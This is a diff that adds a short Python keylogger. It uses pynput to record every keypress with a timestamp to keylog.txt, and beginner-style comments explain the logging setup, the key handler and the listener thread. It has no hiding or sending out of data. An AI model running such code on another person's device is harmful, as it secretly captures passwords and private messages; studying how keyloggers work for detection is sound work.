@@ -1,0 +1,25 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+
+logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
+#logging.basicConfig() is a simple way to configure Python’s logging system.
+# Where logs go (console or file),
+# What minimum severity to record (DEBUG, INFO, WARNING, etc.),
+# How each log line looks (timestamp, level, message),
+# And optionally the file mode, encoding, or format style.
+
+def on_press(key):
+    logging.info(str(key))
+
+
+#on_press is evenet handler that is called whenever a key is pressed.
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+#listener.join()
+
+# Listener runs in a background thread.
+# join() blocks the main thread, waiting for the listener thread to finish.
+# Without join(), your script might exit immediately, stopping the listener before you see any key events.
